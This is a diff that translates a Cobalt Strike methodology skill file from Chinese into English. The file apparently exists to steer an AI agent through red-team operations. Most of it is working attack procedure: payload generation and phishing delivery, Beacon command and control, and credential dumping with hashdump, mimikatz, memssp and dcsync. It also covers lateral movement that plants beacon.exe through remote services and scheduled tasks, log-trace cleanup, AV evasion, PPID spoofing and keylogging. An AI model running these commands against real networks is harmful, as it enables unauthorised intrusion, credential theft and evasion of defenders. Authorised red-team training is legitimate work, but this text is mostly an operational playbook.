@@ -1,40 +1,42 @@
 ---
 name: cobalt-strike
-description: "Cobalt Strike 操作方法论。当需要使用 CS 进行团队协作渗透测试、配置 Listener/Payload、管理 Beacon 会话、执行后渗透操作（提权/横向移动/凭据窃取）或编写 Aggressor 自动化脚本时使用。覆盖 TeamServer 部署、Listener 配置、Payload 生成、Beacon 管理、后渗透命令、Malleable C2 Profile、Aggressor 脚本开发"
+description: "Cobalt Strike operational methodology. Use when you need CS for collaborative team penetration testing, configuring Listeners/Payloads, managing Beacon sessions, performing post-exploitation operations (privilege escalation/lateral movement/credential theft), or writing Aggressor automation scripts. Covers TeamServer deployment, Listener configuration, Payload generation, Beacon management, post-exploitation commands, Malleable C2 Profile, and Aggressor script development"
+zh-signals: "使用 Cobalt Strike 进行 TeamServer/Listener 配置、Beacon 管理与后渗透及 Aggressor 脚本开发。信号:Cobalt Strike,Beacon,C2,TeamServer,后渗透,Aggressor"
+when-to-use: "Use when operating Cobalt Strike for team-based pentesting, configuring listeners/payloads, managing beacons, or writing Aggressor scripts."
 metadata:
-  tags: "cobalt strike,cs,beacon,c2,red team,teamserver,listener,payload,aggressor,malleable c2,后渗透,横向移动,红队"
+  tags: "cobalt strike,cs,beacon,c2,red team,teamserver,listener,payload,aggressor,malleable c2,post-exploitation,lateral movement,red team"
   category: "tool"
 ---
 
-# Cobalt Strike 操作方法论
+# Cobalt Strike Operational Methodology
 
-Cobalt Strike（CS）是商业化红队 C2 框架，采用 C/S 架构实现多人协作渗透。核心优势：**团队协作**（多客户端/多 TeamServer）+ **Beacon 隐蔽通信**（HTTP/HTTPS/DNS/SMB）+ **完整后渗透链**（提权→凭据→横向→持久化）+ **Aggressor 脚本扩展**。
+Cobalt Strike (CS) is a commercial red team C2 framework that uses a C/S architecture to support collaborative penetration testing. Core advantages: **team collaboration** (multiple clients / multiple TeamServers) + **stealthy Beacon communications** (HTTP/HTTPS/DNS/SMB) + **a complete post-exploitation chain** (privilege escalation → credentials → lateral movement → persistence) + **Aggressor script extensibility**.
 
-## 深入参考
+## Further Reading
 
-- Beacon 命令详解与后渗透技术 → [references/beacon-operations.md](references/beacon-operations.md)
-- DNS/SMB/SSH Beacon 与 Arsenal Kit 选择 → [references/beacon-types-and-kits.md](references/beacon-types-and-kits.md)
-- Aggressor 脚本开发指南 → [references/aggressor-scripting.md](references/aggressor-scripting.md)
+- Detailed Beacon commands and post-exploitation techniques → [references/beacon-operations.md](references/beacon-operations.md)
+- DNS/SMB/SSH Beacons and Arsenal Kit selection → [references/beacon-types-and-kits.md](references/beacon-types-and-kits.md)
+- Aggressor script development guide → [references/aggressor-scripting.md](references/aggressor-scripting.md)
 
 ---
 
-## Phase 1: TeamServer 部署与 Listener 配置
+## Phase 1: TeamServer Deployment and Listener Configuration
 
-### TeamServer 启动
+### Starting the TeamServer
 
 ```bash
-# 基础启动（Linux only）
-./teamserver <公网IP> <密码>
+# Basic startup (Linux only)
+./teamserver <public-IP> <password>
 
-# 指定 Malleable C2 配置文件（推荐）
-./teamserver <公网IP> <密码> <profile文件路径>
+# Specify a Malleable C2 configuration file (recommended)
+./teamserver <public-IP> <password> <profile-file-path>
 ```
 
-**部署决策：**
-- 生产环境必须指定 Malleable C2 Profile，默认流量特征已被各大安全产品标记
-- 建议使用 c2lint 工具验证 Profile 有效性：`./c2lint <profile>`
+**Deployment decisions:**
+- A Malleable C2 Profile must be specified in production environments; the default traffic patterns are already flagged by major security products
+- Use the c2lint tool to validate the profile: `./c2lint <profile>`
 
-### 客户端连接
+### Client Connection
 
 ```bash
 # Linux
@@ -43,258 +45,258 @@ Cobalt Strike（CS）是商业化红队 C2 框架，采用 C/S 架构实现多�
 start.bat
 ```
 
-连接需要：TeamServer IP + 端口（默认 50050）+ 密码。首次连接需确认服务器指纹哈希。
+Connection requires: TeamServer IP + port (default 50050) + password. The first connection requires confirming the server fingerprint hash.
 
-### 分布式架构决策
-
-```
-推荐三层服务器模型：
-├── 临时服务器 (Staging) → 初始投递、获取立足点（高暴露风险）
-├── 持久服务器 (Long Haul) → 低频通信保持长期访问
-└── 后渗透服务器 (Post-Ex) → 交互式操作、横向移动
-```
-
-**判断标准：** 单目标可用单 TeamServer；多目标/长期行动必须分层，确保单点失败不影响全局。
-
-### Listener 类型选择决策树
+### Distributed Architecture Decision
 
 ```
-需要创建 Listener？
-├── 出网环境
-│   ├── HTTP/HTTPS 受限但 DNS 可用 → DNS Beacon（低频保活/备用通道）
-│   ├── 常规场景 → HTTPS Beacon（推荐，加密传输）
-│   └── 简单测试 → HTTP Beacon
-├── 内网横向 / 不出网
-│   ├── Windows 环境 → SMB Beacon（命名管道，依赖 SMB 可达和权限）
-│   ├── Linux/macOS 或已有 SSH 凭据 → SSH Beacon
-│   └── 需指定端口 → TCP Beacon（正向绑定）
-└── 联动 MSF → Foreign Listener（HTTP/HTTPS）
+Recommended three-tier server model:
+├── Staging server → initial delivery, gaining a foothold (high exposure risk)
+├── Long Haul server → low-frequency communication to maintain long-term access
+└── Post-Ex server → interactive operations, lateral movement
 ```
 
-**Listener 命名规范：** `OS/Payload/Stager`，例如 `windows/beacon_https/reverse_https`
+**Decision criteria:** A single target can use a single TeamServer; multiple targets / long-term operations must be layered so that a single point of failure does not affect the whole operation.
 
-### 重定向器配置
+### Listener Type Selection Decision Tree
 
-用途：保护 TeamServer 真实 IP + 提高可靠性（多重定向器并行）
+```
+Need to create a Listener?
+├── Egress-enabled environment
+│   ├── HTTP/HTTPS restricted but DNS available → DNS Beacon (low-frequency keepalive / backup channel)
+│   ├── Standard scenario → HTTPS Beacon (recommended, encrypted transport)
+│   └── Simple testing → HTTP Beacon
+├── Internal network lateral movement / no egress
+│   ├── Windows environment → SMB Beacon (named pipe, depends on SMB reachability and permissions)
+│   ├── Linux/macOS or existing SSH credentials → SSH Beacon
+│   └── Need to specify a port → TCP Beacon (forward bind)
+└── Linkage with MSF → Foreign Listener (HTTP/HTTPS)
+```
+
+**Listener naming convention:** `OS/Payload/Stager`, for example `windows/beacon_https/reverse_https`
+
+### Redirector Configuration
+
+Purpose: protect the real TeamServer IP + improve reliability (run multiple redirectors in parallel)
 
 ```bash
-# 在重定向器主机上使用 socat 转发
+# Forward with socat on the redirector host
 socat TCP4-LISTEN:80,fork TCP4:<TeamServer_IP>:80
 socat TCP4-LISTEN:443,fork TCP4:<TeamServer_IP>:443
 ```
 
-将重定向器 IP 添加到 Listener 的 HTTP Hosts 中，靶机流量只与重定向器交互。
+Add the redirector IP to the Listener's HTTP Hosts so that victim traffic only interacts with the redirector.
 
 ---
 
-## Phase 2: Payload 生成与投递
+## Phase 2: Payload Generation and Delivery
 
-### Staged vs Stageless 选择
+### Staged vs Stageless Selection
 
 ```
-Payload 类型选择：
-├── Staged（分阶段）→ 体积小（~17KB），适合有大小限制的场景
-│   └── Stager 先执行 → 回连下载 Stage → 内存加载执行
-├── Stageless（无阶段）→ 体积大（~300KB），全功能自包含
-│   └── 更稳定，适合确定性投递（如钓鱼邮件附件）
-└── 安全特性：Stage 使用团队服务器公钥加密元数据，Stager 无此保护
+Payload type selection:
+├── Staged → small size (~17KB), suitable for size-constrained scenarios
+│   └── Stager executes first → calls back and downloads the Stage → loads and executes in memory
+├── Stageless → large size (~300KB), fully self-contained
+│   └── More stable, suitable for reliable delivery (e.g. phishing email attachment)
+└── Security feature: the Stage encrypts metadata with the team server public key, the Stager has no such protection
 ```
 
-### Payload 格式生成
+### Payload Format Generation
 
-| 路径 | 生成物 | 用途 |
+| Path | Artifact | Purpose |
 |------|--------|------|
-| Packages → HTML Application | .hta 文件 | 钓鱼落地执行 |
-| Packages → MS Office Macro | VBA 宏代码 | 嵌入 Office 文档 |
-| Packages → Payload Generator | 多语言 Payload | 自定义免杀加载器 |
-| Packages → Windows Executable | .exe / .dll | 直接执行或 DLL 注入 |
-| Packages → Windows Executable (S) | Stageless .exe / .dll | 自包含完整 Payload |
+| Packages → HTML Application | .hta file | Phishing with drop-and-execute |
+| Packages → MS Office Macro | VBA macro code | Embed into Office documents |
+| Packages → Payload Generator | Multi-language Payload | Custom AV-evasive loader |
+| Packages → Windows Executable | .exe / .dll | Direct execution or DLL injection |
+| Packages → Windows Executable (S) | Stageless .exe / .dll | Self-contained full Payload |
 
-### 投递方式决策
+### Delivery Method Decision
 
 ```
-如何投递到目标？
-├── 社工钓鱼
-│   ├── 邮件附件 → Office 宏文档 / HTA 文件
-│   ├── 邮件链接 → Scripted Web Delivery 生成一行命令
-│   └── 克隆网站 → Clone Site + 嵌入攻击链接
-├── Web 漏洞利用
-│   ├── MSF 联动 → 设置 Foreign Listener，MSF 中配置对应 payload
+How do you deliver it to the target?
+├── Social engineering phishing
+│   ├── Email attachment → Office macro document / HTA file
+│   ├── Email link → Scripted Web Delivery generates a one-line command
+│   └── Cloned website → Clone Site + embedded malicious link
+├── Web vulnerability exploitation
+│   ├── MSF linkage → set up a Foreign Listener, configure the matching payload in MSF
 │   │   └── set DisablePayloadHandler True; set PrependMigrate True
-│   └── 脚本化交付 → Attacks → Web Drive-by → Scripted Web Delivery
-└── 横向投递
-    └── upload + 远程服务/计划任务执行（见 Phase 4）
+│   └── Scripted delivery → Attacks → Web Drive-by → Scripted Web Delivery
+└── Lateral delivery
+    └── upload + remote service / scheduled task execution (see Phase 4)
 ```
 
 ---
 
-## Phase 3: Beacon 管理
+## Phase 3: Beacon Management
 
-### 会话交互基础
-
-```
-# 进入 Beacon 控制台
-右击会话 → interact
-
-# 通信模式控制
-sleep 60 50     # 异步：60 秒回连，50% 抖动（实际 30-60 秒随机）
-sleep 0         # 交互模式：命令即时执行（OPSEC 风险高）
-```
-
-**OPSEC 原则：** 日常操作保持 sleep >=30s；仅在需要实时交互时临时 `sleep 0`，操作完毕立即恢复。
-
-### 会话传递
+### Session Interaction Basics
 
 ```
-# 派生新会话到其他 Listener
+# Enter the Beacon console
+Right-click a session → interact
+
+# Communication mode control
+sleep 60 50     # Asynchronous: call back every 60 seconds, 50% jitter (actually 30-60 seconds at random)
+sleep 0         # Interactive mode: commands execute immediately (high OPSEC risk)
+```
+
+**OPSEC principle:** Keep `sleep >= 30s` for routine operations; only use `sleep 0` temporarily when real-time interaction is required, and restore it immediately afterwards.
+
+### Session Passing
+
+```
+# Spawn a new session onto another Listener
 spawn <listener_name>
 
-# 注入到指定进程
+# Inject into a specific process
 inject <pid> <x86|x64> <listener_name>
 
-# 传递到 MSF
-# 1. MSF 开启 handler (windows/meterpreter/reverse_https)
-# 2. CS 创建 Foreign Listener 指向 MSF
+# Pass to MSF
+# 1. MSF starts a handler (windows/meterpreter/reverse_https)
+# 2. CS creates a Foreign Listener pointing at MSF
 # 3. spawn <foreign_listener>
 ```
 
-### Pivoting（内网穿透）
+### Pivoting (internal network pivoting)
 
 ```
-内网不出网主机如何上线？
-├── SOCKS 代理（正向）
+How do hosts without egress check in?
+├── SOCKS proxy (forward)
 │   ├── beacon: socks <port>
 │   ├── MSF: setg Proxies socks4:<CS_IP>:<port>
-│   └── 工具: proxychains 配置后使用
-├── 反向端口转发
-│   ├── 右击会话 → Pivoting → Listener（在已上线主机上开 Listener）
-│   └── 生成指向该 Listener 的 Payload，在不出网主机执行
-└── SSH 隧道
+│   └── Tool: proxychains, configure it before use
+├── Reverse port forwarding
+│   ├── Right-click a session → Pivoting → Listener (open a Listener on a host that is already checked in)
+│   └── Generate a Payload pointing at that Listener and run it on the host without egress
+└── SSH tunnel
     ├── ssh -D 1080 user@<pivot_host>
-    └── socat 转发特定端口流量
+    └── socat to forward traffic on a specific port
 ```
 
 ---
 
-## Phase 4: 后渗透操作决策树
+## Phase 4: Post-Exploitation Decision Tree
 
-### 信息收集
-
-```
-# 当前环境侦察
-shell whoami /groups          # 当前权限等级
-shell net view /domain        # 当前域
-net view                      # 域内主机列表（Beacon net 模块，输出更丰富）
-net dclist                    # 域控列表
-```
-
-### 提权决策树
+### Information Gathering
 
 ```
-当前权限不足？
-├── 当前用户是本地管理员组（UAC 中级）
-│   ├── elevate → uac-token-duplication（Win7/Win10 2018.11 前）
-│   ├── runasadmin → 其他 UAC bypass exploit
-│   └── 成功后用户名后出现 * 号标识
-├── 当前用户是普通用户
-│   ├── PowerUp 检查弱点
+# Reconnaissance of the current environment
+shell whoami /groups          # Current privilege level
+shell net view /domain        # Current domain
+net view                      # List of in-domain hosts (Beacon net module, richer output)
+net dclist                    # List of domain controllers
+```
+
+### Privilege Escalation Decision Tree
+
+```
+Insufficient current privileges?
+├── The current user is in the local administrators group (medium-integrity UAC)
+│   ├── elevate → uac-token-duplication (Win7/Win10 before 2018.11)
+│   ├── runasadmin → other UAC bypass exploits
+│   └── A * appears next to the username after success
+├── The current user is a standard user
+│   ├── PowerUp to check for weaknesses
 │   │   └── powershell-import PowerUp.ps1; powershell Invoke-AllChecks
-│   ├── elevate → 选择可用的本地提权 exploit
-│   └── 加载 ElevateKit 扩展更多 exploit
-├── 本地管理员（高权限）→ 系统权限
-│   └── getsystem（Named Pipe 提权到 SYSTEM）
-└── 已有其他用户凭据
+│   ├── elevate → pick an available local privilege escalation exploit
+│   └── Load the ElevateKit extension for more exploits
+├── Local administrator (high privileges) → SYSTEM
+│   └── getsystem (named pipe privilege escalation to SYSTEM)
+└── Other user credentials are already available
     ├── spawnas <domain\user> <password> <listener>
     └── runas <domain\user> <password> <command>
 ```
 
-### 凭据获取决策树
+### Credential Acquisition Decision Tree
 
 ```
-需要获取凭据？
-├── 已是 SYSTEM / 本地管理员
-│   ├── hashdump                    → 导出本地 SAM 哈希
-│   ├── logonpasswords              → Mimikatz 抓取明文密码
-│   ├── mimikatz !lsadump::sam      → 本地账户哈希
-│   ├── mimikatz !lsadump::cache    → 缓存凭证（默认缓存最近 10 个）
-│   └── mimikatz !misc::memssp      → 注入 SSP 记录后续登录明文
-│       └── 结果保存在 C:\windows\system32\mimilsa.log
-├── 域控制器上
-│   ├── hashdump                    → 导出所有域用户哈希
-│   ├── dcsync                      → 远程复制 AD 数据库
-│   └── mimikatz lsadump::dcsync /user:krbtgt → 获取 KRBTGT 哈希
-└── 查看已收集凭据
+Need to obtain credentials?
+├── Already SYSTEM / local administrator
+│   ├── hashdump                    → dump local SAM hashes
+│   ├── logonpasswords              → Mimikatz grabs plaintext passwords
+│   ├── mimikatz !lsadump::sam      → local account hashes
+│   ├── mimikatz !lsadump::cache    → cached credentials (the last 10 are cached by default)
+│   └── mimikatz !misc::memssp      → inject SSP to log subsequent logon passwords in plaintext
+│       └── Results are saved to C:\windows\system32\mimilsa.log
+├── On a domain controller
+│   ├── hashdump                    → dump all domain user hashes
+│   ├── dcsync                      → remotely replicate the AD database
+│   └── mimikatz lsadump::dcsync /user:krbtgt → obtain the KRBTGT hash
+└── View already collected credentials
     └── View → Credentials
 ```
 
-**Mimikatz 执行模式：**
-- `mimikatz <command>` — 当前权限执行
-- `mimikatz !<command>` — 强制提升到 SYSTEM 执行
-- `mimikatz @<command>` — 使用当前 Beacon 令牌执行
+**Mimikatz execution modes:**
+- `mimikatz <command>` — execute with the current privileges
+- `mimikatz !<command>` — force elevation to SYSTEM before executing
+- `mimikatz @<command>` — execute using the current Beacon token
 
-### 横向移动决策树
+### Lateral Movement Decision Tree
 
 ```
-如何移动到目标主机？
-├── 前提：已获取目标主机的信任凭据
-│   ├── 令牌窃取: ps → steal_token <pid>
-│   ├── 凭据创建: make_token <domain\user> <password>
-│   ├── 哈希传递: pth <domain\user> <ntlm_hash>
-│   └── 黄金票据: Access → Golden Ticket（需 KRBTGT 哈希 + 域 SID）
+How do you move to the target host?
+├── Prerequisite: you already hold credentials trusted by the target host
+│   ├── Token theft: ps → steal_token <pid>
+│   ├── Credential creation: make_token <domain\user> <password>
+│   ├── Pass-the-hash: pth <domain\user> <ntlm_hash>
+│   └── Golden Ticket: Access → Golden Ticket (requires the KRBTGT hash + domain SID)
 │
-├── 自动化横向（推荐，无文件落地）
-│   ├── psexec <target> <listener>       → 服务执行（落地 EXE）
-│   ├── psexec_psh <target> <listener>   → 服务执行 PowerShell
-│   ├── winrm <target> <listener>        → WinRM 执行 PowerShell
-│   └── wmi <target> <listener>          → WMI 执行 PowerShell
-│   └── 图形化: View → Targets → 右击 → Jump
+├── Automated lateral movement (recommended, fileless)
+│   ├── psexec <target> <listener>       → service execution (drops an EXE to disk)
+│   ├── psexec_psh <target> <listener>   → service execution of PowerShell
+│   ├── winrm <target> <listener>        → WinRM execution of PowerShell
+│   └── wmi <target> <listener>          → WMI execution of PowerShell
+│   └── Graphical: View → Targets → right-click → Jump
 │
-├── 手动横向
-│   ├── 方法一：Windows 服务
+├── Manual lateral movement
+│   ├── Method 1: Windows service
 │   │   ├── upload beacon.exe
 │   │   ├── shell copy beacon.exe \\target\C$\Windows\Temp
 │   │   ├── shell sc \\target create svc binpath= C:\Windows\Temp\beacon.exe
 │   │   ├── shell sc \\target start svc
-│   │   └── link <target>（SMB Beacon）
-│   └── 方法二：计划任务
-│       ├── shell net time \\target（确认时间）
+│   │   └── link <target> (SMB Beacon)
+│   └── Method 2: Scheduled task
+│       ├── shell net time \\target (confirm the time)
 │       ├── shell at \\target HH:mm C:\path\beacon.exe
-│       └── link <target>（SMB Beacon）
+│       └── link <target> (SMB Beacon)
 │
-└── 清理痕迹
+└── Clean up traces
     ├── shell sc \\target delete svc
     ├── shell del \\target\C$\Windows\Temp\beacon.exe
     └── shell del beacon.exe
 ```
 
-### 域内枚举关键命令
+### Key In-Domain Enumeration Commands
 
 ```
-# 域管理员发现
+# Discover Domain Admins
 shell net group "domain admins" /domain
 shell net group "enterprise admins" /domain
 shell net localgroup "administrators" /domain
 
-# PowerView 高级枚举（避免 net 命令被检测）
+# PowerView advanced enumeration (avoids detection of net commands)
 powershell-import PowerView.ps1
-powershell Find-LocalAdminAccess          # 发现当前用户的本地管理员访问权限
-powershell Get-NetDomain                  # 域信息
-powershell Invoke-ShareFinder             # 共享发现
-powershell Get-NetLocalGroup -Hostname <target>  # 目标本地管理员
+powershell Find-LocalAdminAccess          # Discover local admin access for the current user
+powershell Get-NetDomain                  # Domain information
+powershell Invoke-ShareFinder             # Share discovery
+powershell Get-NetLocalGroup -Hostname <target>  # Local administrators on the target
 ```
 
 ---
 
-## Phase 5: OPSEC 与隐蔽性
+## Phase 5: OPSEC and Stealth
 
 ### Malleable C2 Profile
 
-**作用：** 自定义 Beacon 通信流量特征，伪装成正常业务流量。
+**Purpose:** customize the traffic fingerprints of Beacon communications so that they look like normal business traffic.
 
 ```
-# Profile 基本结构
-set sleeptime "60000";     # 回连间隔（毫秒）
-set jitter "50";           # 抖动百分比
+# Basic profile structure
+set sleeptime "60000";     # Callback interval (milliseconds)
+set jitter "50";           # Jitter percentage
 set useragent "Mozilla/5.0 ...";
 
 http-get {
@@ -317,65 +319,65 @@ http-post {
 }
 ```
 
-**关键配置项：**
-- `sleeptime` + `jitter` — 控制通信频率和随机性
-- `spawnto` — 指定 spawn/inject 使用的进程（避免 rundll32.exe）
-- `set host_stage "false"` — 禁用 staging（防止 Stager 被扫描发现）
+**Key configuration items:**
+- `sleeptime` + `jitter` — control communication frequency and randomness
+- `spawnto` — specify the process used by spawn/inject (avoids rundll32.exe)
+- `set host_stage "false"` — disable staging (prevents the Stager from being found by scanners)
 
-### 进程注入 OPSEC
+### Process Injection OPSEC
 
 ```
-# 使用 spawnto 避免默认 rundll32.exe
+# Use spawnto to avoid the default rundll32.exe
 spawnto x64 %windir%\sysnative\svchost.exe -k netsvcs
 spawnto x86 %windir%\syswow64\svchost.exe -k netsvcs
 
-# PPID 欺骗 — 使新进程看起来是由合法父进程创建
-ppid <合法进程PID>
+# PPID spoofing — make the new process look like it was created by a legitimate parent process
+ppid <legitimate-process-PID>
 ```
 
-### Arsenal Kit 与免杀策略
+### Arsenal Kit and AV Evasion Strategy
 
 ```
-选择适配方案：
-├── Artifact Kit → 自定义 EXE/DLL 生成模板
-│   └── 生成物落地即被静态查杀时使用
-├── Resource Kit → 修改 HTA/PowerShell/VBA/VBS 等脚本模板
-│   └── 默认投递模板特征明显时使用
+Choose the matching approach:
+├── Artifact Kit → custom EXE/DLL generation templates
+│   └── Use when the generated artifact is detected statically as soon as it lands on disk
+├── Resource Kit → modify HTA/PowerShell/VBA/VBS script templates
+│   └── Use when the default delivery template has obvious fingerprints
 ├── Sleep Mask / Mutator / Thread Stack Spoofer
-│   └── 内存扫描或线程栈检测压力高时使用
-├── 自定义加载器 → Payload Generator 输出 raw shellcode
-│   └── 用 C/Go/Rust 编写自定义加载器
-└── 注意：Kit 只能降低特定检测面，不能替代流量、进程链和权限 OPSEC
+│   └── Use when memory scanning or thread stack detection pressure is high
+├── Custom loader → Payload Generator outputs raw shellcode
+│   └── Write a custom loader in C/Go/Rust
+└── Note: a Kit can only reduce specific detection surfaces, it cannot replace traffic, process chain, and privilege OPSEC
 ```
 
-详细选择边界见 [references/beacon-types-and-kits.md](references/beacon-types-and-kits.md)。
+See [references/beacon-types-and-kits.md](references/beacon-types-and-kits.md) for the detailed selection boundaries.
 
 ---
 
-## 速查：最常用 Beacon 命令
+## Quick Reference: Most Commonly Used Beacon Commands
 
-| 命令 | 说明 |
+| Command | Description |
 |------|------|
-| `sleep <秒> [抖动%]` | 设置回连间隔和抖动 |
-| `shell <命令>` | 通过 cmd.exe 执行命令 |
-| `powershell <命令>` | 通过 powershell.exe 执行 |
-| `powerpick <命令>` | 不使用 powershell.exe 执行 PS 命令 |
-| `execute-assembly <path>` | 内存加载 .NET 程序集 |
-| `upload / download` | 文件上传 / 下载 |
-| `hashdump` | 导出 SAM 哈希 |
-| `logonpasswords` | Mimikatz 抓取密码 |
-| `steal_token <pid>` | 窃取进程令牌 |
-| `make_token <domain\user> <pass>` | 创建令牌 |
+| `sleep <seconds> [jitter%]` | Set the callback interval and jitter |
+| `shell <command>` | Execute a command via cmd.exe |
+| `powershell <command>` | Execute via powershell.exe |
+| `powerpick <command>` | Execute a PS command without powershell.exe |
+| `execute-assembly <path>` | Load a .NET assembly in memory |
+| `upload / download` | Upload / download files |
+| `hashdump` | Dump SAM hashes |
+| `logonpasswords` | Mimikatz grabs passwords |
+| `steal_token <pid>` | Steal a process token |
+| `make_token <domain\user> <pass>` | Create a token |
 | `pth <domain\user> <hash>` | Pass-the-Hash |
-| `rev2self` | 恢复原始令牌 |
-| `spawn <listener>` | 派生新会话 |
-| `inject <pid> <arch> <listener>` | 注入进程 |
-| `socks <port>` | 开启 SOCKS 代理 |
-| `link / unlink <target>` | 连接 / 断开 SMB/TCP Beacon |
-| `ps` | 列出进程 |
-| `jobs / jobkill <id>` | 管理后台任务 |
-| `screenshot / keylogger` | 截屏 / 键盘记录 |
-| `getsystem` | 提权到 SYSTEM |
-| `elevate <exploit> <listener>` | 使用 exploit 提权 |
-| `portscan <targets> <ports> <method>` | 端口扫描（arp/icmp/none） |
-| `clear` | 清除命令队列 |
+| `rev2self` | Restore the original token |
+| `spawn <listener>` | Spawn a new session |
+| `inject <pid> <arch> <listener>` | Inject into a process |
+| `socks <port>` | Start a SOCKS proxy |
+| `link / unlink <target>` | Connect / disconnect an SMB/TCP Beacon |
+| `ps` | List processes |
+| `jobs / jobkill <id>` | Manage background jobs |
+| `screenshot / keylogger` | Take screenshots / keylog |
+| `getsystem` | Escalate to SYSTEM |
+| `elevate <exploit> <listener>` | Escalate with an exploit |
+| `portscan <targets> <ports> <method>` | Port scanning (arp/icmp/none) |
+| `clear` | Clear the command queue |
